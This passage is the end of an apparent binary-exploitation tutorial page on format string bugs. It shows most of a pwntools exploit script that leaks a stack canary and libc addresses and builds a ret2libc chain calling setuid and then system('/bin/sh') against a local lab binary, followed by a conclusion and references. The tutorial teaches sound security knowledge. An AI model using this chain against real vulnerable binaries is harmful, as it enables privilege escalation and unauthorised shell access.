    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"Leaked libc puts(): </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"Leaked base libc address: </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc_address</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">leaked_libc_address</span>



<span class="k">def</span> <span class="nf">setuid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">):</span>

    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="c1"># Calculating libc function addresses</span>
    <span class="n">setuid_addr</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">+</span> <span class="n">setuid_off</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"setuid(): </span><span class="si">%s</span><span class="s2">"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">setuid_addr</span><span class="p">))</span>

    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="n">eipOffset</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">setuid_addr</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getShell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">):</span>


    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

    <span class="c1"># Calculating libc function addresses</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">+</span> <span class="n">system_off</span>
    <span class="n">exit_addr</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">+</span> <span class="n">exit_off</span>
    <span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">+</span> <span class="n">bin_sh_off</span>

    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"system(): </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"exit(): </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">: </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">))</span>


    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">junk</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="n">eipOffset</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">exit_addr</span><span class="p">)</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>


    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>


    <span class="c1"># Canary leak</span>
    <span class="n">canary</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"Leaked canary: </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>

    <span class="c1"># Buffer Overflow</span>
    <span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">leak_libc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
    <span class="n">setuid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">)</span>
    <span class="n">getShell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">)</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">main</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Aborting...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
<br/><h2>Conclusion</h2><br/>
<p>The format string vulnerability can be highly damaging. As demonstrated, it can aid in exploiting buffer overflows even when the binary is protected by Stack Canary, and it allows for arbitrary memory writes. Exploiting this vulnerability isn't overly complex if approached with knowledge and skill.</p><br/>
<p>While our focus has been on 32-bit programs, these principles extend to 64-bit programs, where similar techniques apply. In future articles, we'll explore exploiting buffer overflows in 64-bit programs using the ret2libc technique, which involves leaking a libc address (since brute-force isn't feasible) as well. The concept of bypassing Canary Protection remains the same in 64-bit programs, but the canary value is larger (64 bits).</p><br/>
<p>I hope I've explained these concepts clearly, and I trust you've learned something valuable from this article.</p><br/>
<p>Happy hacking!</p><br/>
<h3>References</h3><br/>
<p><a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">https://ir0nstone.gitbook.io/notes/types/stack/canaries</a>
<br/>
<a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr">https://ir0nstone.gitbook.io/notes/types/stack/aslr</a>
<br/>
<a href="https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html">https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html</a>
<br/>
<a href="https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html">https://elswix.github.io/articles/2/assembly-instructions-intel-x86.html</a>
<br/>
<a href="https://elswix.github.io/writeups/htb/hard/drive/drive.html">https://elswix.github.io/writeups/htb/hard/drive/drive.html</a>
<br/>
<a href="https://elswix.github.io/articles/8/return-2-libc.html">https://elswix.github.io/articles/8/return-2-libc.html</a>
<br/>
<a href="https://elswix.github.io/articles/6/PLT-and-GOT.html">https://elswix.github.io/articles/6/PLT-and-GOT.html</a>
<br/>
<a href="https://elswix.github.io/articles/4/binary-protections.html">https://elswix.github.io/articles/4/binary-protections.html</a>
<br/>
<a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite">https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite</a>
<br/>
<a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite">https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite</a>
<br/>
<a href="https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/">https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/</a></p><br/>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
